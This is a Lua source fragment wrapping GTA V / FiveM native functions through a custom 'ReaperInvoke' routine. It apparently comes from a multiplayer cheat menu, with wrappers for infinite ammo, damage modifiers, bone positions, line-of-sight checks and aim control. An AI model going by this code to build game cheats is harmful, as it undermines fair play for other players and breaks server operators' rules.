    function __REAPER1__.N.SetPedWeaponTintIndex(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x50969B9B89ED5738, p1, p2, p3) end
    function __REAPER1__.N.SetPedInfiniteAmmoClip(p1,p2) return __REAPER1__.N.ReaperInvoke(0x183DADC6AA953186, p1, p2) end
    function __REAPER1__.N.IsPauseMenuActive() return __REAPER1__.N.ReaperInvoke(0xB0034A223497FFCB, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.WeaponCoords(p1) return __REAPER1__.N.ReaperInvoke(0x1899F328B0E12848, __REAPER1__.N.ReaperInvoke(0x3B390A939AF0B5FC, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()), 0.2, 0, 0.06, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end -- 0.05, 0.05
    function __REAPER1__.N.ClearAreaOfProjectiles(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x0A1CB9094635D1A6, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.PedSkipNextReloading(p1) return __REAPER1__.N.ReaperInvoke(0x8C0D57EA686FAD87, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.MakePedReload(p1) return __REAPER1__.N.ReaperInvoke(0x20AE33F3AC9C0033, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetCurrentPedWeapon(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xADF692B254977C0C, p1, p2, p3) end
    function __REAPER1__.N.GetBestPedWeapon(p1,p2) return __REAPER1__.N.ReaperInvoke(0x8483E98E8B888AE2, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetPlayerName(p1) return __REAPER1__.F.RemoveEmoji(__REAPER1__.N.ReaperInvoke(0x6D0DE6A7B5DA71F8, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())) end
    function __REAPER1__.N.GetLocalTime() return __REAPER1__.N.ReaperInvoke(0x50C7A99057A69748, Citizen.PointerValueInt(), Citizen.PointerValueInt(), Citizen.PointerValueInt(), Citizen.PointerValueInt(), Citizen.PointerValueInt(), Citizen.PointerValueInt()) end
    function __REAPER1__.N.SetPedIntoVehicle(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xF75B0D629E1C063D, p1, p2, p3) end
    function __REAPER1__.N.GetPedInVehicleSeat(p1,p2) return __REAPER1__.N.ReaperInvoke(0xBB40DD2270B65366, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetVehicleCustomSecondaryColour(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x36CED73BFED89754, p1, p2, p3, p4) end
    function __REAPER1__.N.SetVehicleCustomPrimaryColour(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x7141766F91D15BEA, p1, p2, p3, p4) end
    function __REAPER1__.N.IsPedRagdoll(p1) return __REAPER1__.N.ReaperInvoke(0x47E4E977581C5B55, p1, Citizen.ReturnResultAnyway())  end
    function __REAPER1__.N.IsEntityAPed(p1) return __REAPER1__.N.ReaperInvoke(0x524AC5ECEA15343E, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsEntityAVehicle(p1) return __REAPER1__.N.ReaperInvoke(0x6AC7003FA6E5575E, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleGravity(p1,p2) return __REAPER1__.N.ReaperInvoke(0x89F149B6131E57DA, p1, p2) end
    function __REAPER1__.N.SetPedGravity(p1,p2) return __REAPER1__.N.ReaperInvoke(0x9FF447B6B6AD960A, p1, p2) end
    function __REAPER1__.N.CreatePed(p1,p2,p3,p4,p5,p6,p7,p8) return __REAPER1__.N.ReaperInvoke(0xD49F9B0955C367DE, p1, p2, p3, p4, p5, p6, p7, p8, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetPedType(p1) return __REAPER1__.N.ReaperInvoke(0xFF059E1E4C01E63C, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.HasWeaponAssetLoaded(p1) return __REAPER1__.N.ReaperInvoke(0x36E353271F0E90EE, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RequestWeaponAsset(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x5443438F033E29C3, p1, p2, p3) end
    function __REAPER1__.N.RemoveWeaponAsset(p1) return __REAPER1__.N.ReaperInvoke(0xAA08EF13F341C8FC, p1) end
    function __REAPER1__.N.GetPedTimeOfDeath(p1) return __REAPER1__.N.ReaperInvoke(0x1E98817B311AE98A, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetWeapontypeGroup(p1) return __REAPER1__.N.ReaperInvoke(0xC3287EE3050FB74C, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.ClearEntityLastDamageEntity(p1) return __REAPER1__.N.ReaperInvoke(0xA72CD9CA74A5ECBA, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetGameplayCamRelativeRotation(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x48608C3464F58AB4, p1, p2, p3) end
    function __REAPER1__.N.SetControlNormal(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xE8A25867FBA3B05E, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetMaxRangeOfCurrentPedWeapon(p1) return __REAPER1__.N.ReaperInvoke(0x814C9D19DFD69679, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.GetWeaponDamage(p1,p2) return __REAPER1__.N.ReaperInvoke(0x3133B907D8B32053, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.HasEntityClearLosToEntity(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xFCDFF7B72D23A1AC, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetPedBoneCoords(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x17C07FC640E86B4E, p1, p2, p3, p4, p5, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.DrawSprite(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12)
        if p12 and not __REAPER1__.N.ReaperInvoke(0x0145F696AAAAD2E4, p1, Citizen.ReturnResultAnyway()) then
            __REAPER1__.N.ReaperInvoke(0xDFA2EF8E04127DD5, p1)
            __REAPER1__.N.ReaperInvoke(0xBE2CACCF5A8AA805, p1)
        end
        
        __REAPER1__.N.ReaperInvoke(0xE7FFAE5EBF23D890, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11)
    end
    function __REAPER1__.N.HasStreamedTextureDictLoaded(p1) return __REAPER1__.N.ReaperInvoke(0x0145F696AAAAD2E4, tostring(p1), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.RequestTextureDict(p1,p2) return __REAPER1__.N.ReaperInvoke(0xDFA2EF8E04127DD5, p1, p2) end
    function __REAPER1__.N.SetStreamedTextureDictAsNoLongerNeeded(p1) return __REAPER1__.N.ReaperInvoke(0xBE2CACCF5A8AA805, tostring(p1)) end
    function __REAPER1__.N.GetActivePlayers() return msgpack.unpack(__REAPER1__.N.ReaperInvoke(0xcf143fb9, Citizen.ReturnResultAnyway(), Citizen.ResultAsObject())) end
    function __REAPER1__.N.DrawLine(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10) return __REAPER1__.N.ReaperInvoke(0x6B7256074AE34680, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10) end
    function __REAPER1__.N.SetVehicleDirtLevel(p1,p2) return __REAPER1__.N.ReaperInvoke(0x79D3B596FE44EE8B, p1, p2) end
    function __REAPER1__.N.GetEntityCanBeDamaged(p1) return __REAPER1__.N.ReaperInvoke(0xD95CC5D2AB15A09F, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsEntityVisible(p1) return __REAPER1__.N.ReaperInvoke(0x47D6F43D77935C75, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleEngineOn(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x2497C4717C8B881E, p1, p2, p3, p4) end
    function __REAPER1__.N.GetEntityAlpha(p1) return __REAPER1__.N.ReaperInvoke(0x5A47B3B5E63E94C6, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetVehicleGravity(p1,p2) return __REAPER1__.N.ReaperInvoke(0x89F149B6131E57DA, p1, p2) end
    function __REAPER1__.N.GetVehicleGravityAmount(p1) return __REAPER1__.N.ReaperInvoke(0xb48a1292, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.SetVehicleLightMultiplier(p1,p2) return __REAPER1__.N.ReaperInvoke(0xB385454F8791F57C, p1, p2) end
    function __REAPER1__.N.ForceVehicleEngineAudio(p1,p2) return __REAPER1__.N.ReaperInvoke(0x4F0C413926060B38, p1, tostring(p2)) end
    function __REAPER1__.N.UseParticleFxAsset(p1) return __REAPER1__.N.ReaperInvoke(0x6C38AF3693A69A91, tostring(p1)) end
    function __REAPER1__.N.GetVehicleCurrentRpm(p1) return __REAPER1__.N.ReaperInvoke(0xe7b12b54, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.StartNetworkedParticleFxLoopedOnEntityBone(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13) return __REAPER1__.N.ReaperInvoke(0xDDE23F30CC5A0F03, tostring(p1), p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetEntityBoneIndexByName(p1,p2) return __REAPER1__.N.ReaperInvoke(0xFB71170B7E76ACBA, p1, tostring(p2), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.StopParticleFxLooped(p1,p2) return __REAPER1__.N.ReaperInvoke(0x8F75998877616996, p1, p2) end
    function __REAPER1__.N.GetWorldPositionOfEntityBone(p1,p2) return __REAPER1__.N.ReaperInvoke(0x44A8FCB8ED227738, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetEntitySpeed(p1) return __REAPER1__.N.ReaperInvoke(0xD5037BA82E12416F, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.ShouldUseMetricMeasurements() return __REAPER1__.N.ReaperInvoke(0xD3D15555431AB793, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleNumberPlateText(p1,p2) return __REAPER1__.N.ReaperInvoke(0x95A88F0B409CDA47, p1, tostring(p2)) end
    function __REAPER1__.N.SetVehicleModKit(p1,p2) return __REAPER1__.N.ReaperInvoke(0x1F2AA07F00B3217A, p1, p2) end
    function __REAPER1__.N.SetVehicleNumberPlateTextIndex(p1,p2) return __REAPER1__.N.ReaperInvoke(0x9088EB5A43FFB0A1, p1, p2) end
    function __REAPER1__.N.SetVehicleMod(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x6AF0636DDEDCB6DD, p1, p2, p3, p4) end
    function __REAPER1__.N.ToggleVehicleMod(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x2A1F4F37F95BAD08, p1, p2, p3) end
    function __REAPER1__.N.SetVehicleWindowTint(p1,p2) return __REAPER1__.N.ReaperInvoke(0x57C51E6BAD752696, p1, p2) end
    function __REAPER1__.N.SetVehicleExtra(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x7EE3A3C5E4A40CC9, p1, p2, p3) end
    function __REAPER1__.N.GetVehicleModKit(p1) return __REAPER1__.N.ReaperInvoke(0x6325D1A044AE510D, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetNumVehicleMods(p1,p2) return __REAPER1__.N.ReaperInvoke(0xE38E9162A2500646, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsVehicleExtraTurnedOn(p1,p2) return __REAPER1__.N.ReaperInvoke(0xD2E6822DBFD6C8BD, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleEnveffScale(p1,p2) return __REAPER1__.N.ReaperInvoke(0x3AFDC536C3D01674, p1, p2) end
    function __REAPER1__.N.SetVehicleModColor_1(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x43FEB945EE7F85B8, p1, p2, p3, p4) end
    function __REAPER1__.N.SetVehicleColours(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x4F1D4BE3A7F24601, p1, p2, p3) end
    function __REAPER1__.N.SetVehicleModColor_2(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x816562BADFDEC83E, p1, p2, p3) end
    function __REAPER1__.N.SetVehicleExtraColours(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x2036F561ADD12E33, p1, p2, p3) end
    function __REAPER1__.N.GetVehicleExtraColours(p1) return __REAPER1__.N.ReaperInvoke(0x3BC4245933A166F7, p1, Citizen.PointerValueInt(), Citizen.PointerValueInt()) end
    function __REAPER1__.N.SetVehicleNeonLightEnabled(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x2AA720E4287BF269, p1, p2, p3) end
    function __REAPER1__.N.IsVehicleNeonLightEnabled(p1,p2) return __REAPER1__.N.ReaperInvoke(0x8C4B92553E4766A5, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleNeonLightsColour(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x8E0A582209A62695, p1, p2, p3, p4) end
    function __REAPER1__.N.SetVehicleXenonLightsColour(p1,p2) return __REAPER1__.N.ReaperInvoke(0xE41033B25D003A07, p1, p2) end
    function __REAPER1__.N.SetVehicleWheelType(p1,p2) return __REAPER1__.N.ReaperInvoke(0x487EB21CC7295BA1, p1, p2) end
    function __REAPER1__.N.SetVehicleTyresCanBurst(p1,p2) return __REAPER1__.N.ReaperInvoke(0xEB9DC3C7D8596C46, p1, p2) end
    function __REAPER1__.N.SetVehicleTyreSmokeColor(p1, p2, p3, p4) return __REAPER1__.N.ReaperInvoke(0xB5BA80F839791C0F, p1, p2, p3, p4) end
    function __REAPER1__.N.GetVehicleMod(p1,p2) return __REAPER1__.N.ReaperInvoke(0x772960298DA26FDB, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.DecorExistOn(p1,p2) return __REAPER1__.N.ReaperInvoke(0x05661B80A8C9165F, p1, p2, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.DecorSetFloat(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x211AB1DD8D0F363A, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleFuelLevel(p1,p2) return __REAPER1__.N.ReaperInvoke(0xba970511, p1, p2) end
    function __REAPER1__.N.SetVehicleBodyHealth(p1,p2) return __REAPER1__.N.ReaperInvoke(0xB77D05AC8C78AADB, p1, p2) end
    function __REAPER1__.N.SetVehicleEngineHealth(p1,p2) return __REAPER1__.N.ReaperInvoke(0x45F6D8EEF34ABEF1, p1, p2) end
    function __REAPER1__.N.SetVehicleDeformationFixed(p1) return __REAPER1__.N.ReaperInvoke(0x953DA1E1B12C0491, p1) end
    function __REAPER1__.N.SetVehicleForwardSpeed(p1,p2) return __REAPER1__.N.ReaperInvoke(0xAB54A438726D25D5, p1, p2) end
    function __REAPER1__.N.ModifyVehicleTopSpeed(p1,p2) return __REAPER1__.N.ReaperInvoke(0x93A3996368C94158, p1, p2) end
    function __REAPER1__.N.SetPedCanBeKnockedOffVehicle(p1,p2) return __REAPER1__.N.ReaperInvoke(0x7A6535691B477C48, p1, p2) end
    function __REAPER1__.N.SetVehicleWheelieState(p1,p2) return __REAPER1__.N.ReaperInvoke(0xeab8db65, p1, p2) end
    function __REAPER1__.N.SetDriverAbility(p1,p2) return __REAPER1__.N.ReaperInvoke(0xB195FFA8042FC5C3, p1, p2) end
    function __REAPER1__.N.SetDriverAggressiveness(p1,p2) return __REAPER1__.N.ReaperInvoke(0xA731F608CA104E3C, p1, p2) end
    function __REAPER1__.N.TaskVehicleDriveWander(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x480142959D337D00, p1, p2, p3, p4) end
    function __REAPER1__.N.GetVehiclePedIsUsing(p1) return __REAPER1__.N.ReaperInvoke(0x6094AD011A2EA87D, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsPedOnFoot(p1) return __REAPER1__.N.ReaperInvoke(0x01FEE67DB37F59B2, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetVehicleCheatPowerIncrease(p1,p2) return __REAPER1__.N.ReaperInvoke(0xB59E4BD37AE292DB, p1, p2) end
    function __REAPER1__.N.SetVehicleBoostActive(p1,p2) return __REAPER1__.N.ReaperInvoke(0x4A04DE7CAB2739A1, p1,p2) end
    function __REAPER1__.N.AnimpostfxPlay(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x2206BF9A37B7F724, tostring(p1), p2, p3) end
    function __REAPER1__.N.SetVehicleCurrentRpm(p1,p2) return __REAPER1__.N.ReaperInvoke(0x2a01a8fc, p1, p2) end
    function __REAPER1__.N.GetVehicleHandlingFloat(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x642fc12f, p1, p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.SetVehicleHandlingFloat(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x488c86d2, p1, p2, p3, p4) end
    function __REAPER1__.N.SetVehicleDoorOpen(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x7C65DAC73C35C862, p1, p2, p3, p4) end
    function __REAPER1__.N.SetVehicleDoorsShut(p1,p2) return __REAPER1__.N.ReaperInvoke(0x781B3D62BB013EF5, p1, p2) end
    function __REAPER1__.N.GetVehicleDoorLockStatus(p1) return __REAPER1__.N.ReaperInvoke(0x25BC98A59C2EA962, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetVehicleDoorShut(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x93D9BD300D7789E5, p1, p2, p3) end
    function __REAPER1__.N.SetVehicleDoorBroken(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xD4D4F6A4AB575A33, p1, p2, p3) end
    function __REAPER1__.N.GetControlInstructionalButton(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x0499D7B09FC9B407, p1, p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsString()) end
    function __REAPER1__.N.GetPlayerPed(p1) return __REAPER1__.N.ReaperInvoke(0x43A66C31C68491C0, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.RegisterPedheadshot(p1) return __REAPER1__.N.ReaperInvoke(0x4462658788425076, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.IsPedheadshotReady(p1) return __REAPER1__.N.ReaperInvoke(0x7085228842B13A67, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsPedheadshotValid(p1) return __REAPER1__.N.ReaperInvoke(0xA0A9668F158129A2, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetPedheadshotTxdString(p1) return __REAPER1__.N.ReaperInvoke(0xDB4EACD4AD0A5D6B, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsString()) end
    function __REAPER1__.N.UnregisterPedheadshot(p1) return __REAPER1__.N.ReaperInvoke(0x96B1361D9B24C2FF, p1) end
    function __REAPER1__.N.SetPedCoordsKeepVehicle(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x9AFEFF481A85AB2E, p1, p2, p3, p4) end
    function __REAPER1__.N.SetFocusEntity(p1) return __REAPER1__.N.ReaperInvoke(0x198F77705FA0931D, p1) end
    function __REAPER1__.N.GetFirstBlipInfoId(p1) return __REAPER1__.N.ReaperInvoke(0x1BEDE233E6CD2A1F, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.DoesBlipExist(p1) return __REAPER1__.N.ReaperInvoke(0xA6DB27D19ECBB7DA, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetBlipInfoIdCoord(p1) return __REAPER1__.N.ReaperInvoke(0xFA7C7F0AADF25D09, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetGroundZFor_3dCoord(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xC906A7DAB05C8D2B, p1, p2, p3, Citizen.PointerValueFloat(), p4, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsAnyVehicleNearPoint(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x61E1DD6125A3EEE6, p1, p2, p3, p4, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetClosestVehicle(p1,p2,p3,p4,p5,p6) return __REAPER1__.N.ReaperInvoke(0xF73EB622C4F1689B, p1, p2, p3, p4, p5, p6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GiveWeaponComponentToPed(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xD966D51AA5B28BB9, p1, p2, p3) end
    function __REAPER1__.N.GetPedAmmoTypeFromWeapon(p1,p2) return __REAPER1__.N.ReaperInvoke(0x7FEAD38B326B9F74, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetPedAmmoByType(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x5FD1E1F011E76D7E, p1, p2, p3) end
    function __REAPER1__.N.AddAmmoToPedByType(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x2472622CE1F2D45F, p1, p2, p3) end
    function __REAPER1__.N.RemoveWeaponComponentFromPed(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x1E8BE90C74FB4C09, p1, p2, p3) end
    function __REAPER1__.N.SetPedInfiniteAmmo(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x3EDCB0505123623B, p1, p2, p3) end
    function __REAPER1__.N.SetWeaponDamageModifier(p1,p2) return __REAPER1__.N.ReaperInvoke(0x4757F00BC6323CFE, p1, p2) end
    function __REAPER1__.N.SetAmmoInClip(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xDCD2A934D65CB497, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetAmmoInPedWeapon(p1,p2) return __REAPER1__.N.ReaperInvoke(0x015A522136D7F951, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetAmmoInClip(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x2E1202248937775C, p1, p2, Citizen.PointerValueIntInitialized(p3), Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.GetMaxAmmoInClip(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xA38DCFFCEA8962FA, p1, p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.HasPedGotWeaponComponent(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xC593212475FAE340, p1, p2, p3, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.IsTaskMoveNetworkActive(p1) return __REAPER1__.N.ReaperInvoke(0x921CE12C489C4C41, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.TaskMoveNetworkByName(p1,p2,p3,p4,p5,p6) return __REAPER1__.N.ReaperInvoke(0x2D537BA194896636, p1, tostring(p2), p3, p4, tostring(p5), p6) end
    function __REAPER1__.N.SetTaskMoveNetworkSignalFloat(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xD5BB4025AE449A4E, p1, tostring(p2), p3) end
    function __REAPER1__.N.SetTaskMoveNetworkSignalBool(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0xB0A6CFD2C69C1088, p1, tostring(p2), p3) end
    function __REAPER1__.N.IsEntityPlayingAnim(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x1F0B79228E461EC9, p1, tostring(p2), tostring(p3), p4, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.TaskFollowToOffsetOfEntity(p1,p2,p3,p4,p5,p6,p7,p8,p9) return __REAPER1__.N.ReaperInvoke(0x304AE42E357B8C7E, p1, p2, p3, p4, p5, p6, p7, p8, p9) end
    function __REAPER1__.N.GetPlayerFromServerId(p1) return __REAPER1__.N.ReaperInvoke(0x344ea166, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.TaskCombatPed(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xF166E48407BAC484, p1, p2, p3, p4) end
    function __REAPER1__.N.AddBlipForCoord(p1,p2,p3) return __REAPER1__.N.ReaperInvoke(0x5A039BB0BCA604B6, p1, p2, p3, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.SetBlipSprite(p1,p2) return __REAPER1__.N.ReaperInvoke(0xDF735600A4696DAF, p1, p2) end
    function __REAPER1__.N.SetBlipScale(p1,p2) return __REAPER1__.N.ReaperInvoke(0xD38744167B2FA257, p1, p2) end
    function __REAPER1__.N.SetBlipCoords(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0xAE2AF67E9D9AF65D, p1, p2, p3, p4) end
    function __REAPER1__.N.SetBlipAlpha(p1,p2) return __REAPER1__.N.ReaperInvoke(0x45FF974EEE1C8734, p1, p2) end
    function __REAPER1__.N.RemoveBlip(p1) return __REAPER1__.N.ReaperInvoke(0x86A652570E5F25DD, Citizen.PointerValueIntInitialized(p1)) end
    function __REAPER1__.N.BeginTextCommandSetBlipName(p1) return __REAPER1__.N.ReaperInvoke(0xF9113A30DE5C6670, tostring(p1)) end
    function __REAPER1__.N.AddTextComponentSubstringPlayerName(p1) return __REAPER1__.N.ReaperInvoke(0x6C188BE134E074AA, tostring(p1)) end
    function __REAPER1__.N.EndTextCommandSetBlipName(p1) return __REAPER1__.N.ReaperInvoke(0xBC38B49BCB83BC9B, p1) end
    function __REAPER1__.N.SetBlipRotation(p1,p2) return __REAPER1__.N.ReaperInvoke(0xF87683CDF73C3F6E, p1, p2) end
    function __REAPER1__.N.SetBlipColour(p1,p2) return __REAPER1__.N.ReaperInvoke(0x03D7FB09E75D6B7E, p1, p2) end
    function __REAPER1__.N.GetGameplayCamFov() return __REAPER1__.N.ReaperInvoke(0x65019750A0324133, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat()) end
    function __REAPER1__.N.DoesCamExist(p1) return __REAPER1__.N.ReaperInvoke(0xA7A932170592B50E, p1, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.SetCamFov(p1,p2) return __REAPER1__.N.ReaperInvoke(0xB13C14F66A00D047, p1, p2) end
    function __REAPER1__.N.SetBigmapActive(p1,p2) return __REAPER1__.N.ReaperInvoke(0x231C8F89D0539D8F, p1, p2) end
    function __REAPER1__.N.SetRadarZoom(p1) return __REAPER1__.N.ReaperInvoke(0x096EF57A0C999BBA, p1) end
    function __REAPER1__.N.SetMobilePhoneRadioState(p1) return __REAPER1__.N.ReaperInvoke(0xBF286C554784F3DF, p1) end
    function __REAPER1__.N.SetMobileRadioEnabledDuringGameplay(p1) return __REAPER1__.N.ReaperInvoke(0x1098355A16064BB3, p1) end
    function __REAPER1__.N.SetPedWetnessHeight(p1,p2) return __REAPER1__.N.ReaperInvoke(0x44CB6447D2571AA0, p1, p2) end
    function __REAPER1__.N.ClearPedWetness(p1) return __REAPER1__.N.ReaperInvoke(0x9C720776DAA43E7E, p1) end
    function __REAPER1__.N.ClearPedBloodDamage(p1) return __REAPER1__.N.ReaperInvoke(0x8FE22675A5A45817, p1) end
    function __REAPER1__.N.SetCamRot(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x85973643155D0B07, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.SetCamCoord(p1,p2,p3,p4) return __REAPER1__.N.ReaperInvoke(0x4D41783FB745E42E, p1, p2, p3, p4) end
    function __REAPER1__.N.SetRadarAsInteriorThisFrame(p1,p2,p3,p4,p5) return __REAPER1__.N.ReaperInvoke(0x59E727A1C9D3E31A, p1, p2, p3, p4, p5) end
    function __REAPER1__.N.DontTiltMinimapThisFrame() return __REAPER1__.N.ReaperInvoke(0x6D14BFDC33B34F55) end
    function __REAPER1__.N.IsRadarHidden() return __REAPER1__.N.ReaperInvoke(0x157F93B036700462, Citizen.ReturnResultAnyway()) end
    function __REAPER1__.N.DisplayRadar(p1) return __REAPER1__.N.ReaperInvoke(0xA0EBB943C300E693, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()) end
    function __REAPER1__.N.GetCamCoord(p1) return __REAPER1__.N.ReaperInvoke(0xBAC038F7459AE5AE, p1, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
    function __REAPER1__.N.GetCamRot(p1,p2) return __REAPER1__.N.ReaperInvoke(0x7D304C1C955E3E12, p1, p2, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()) end
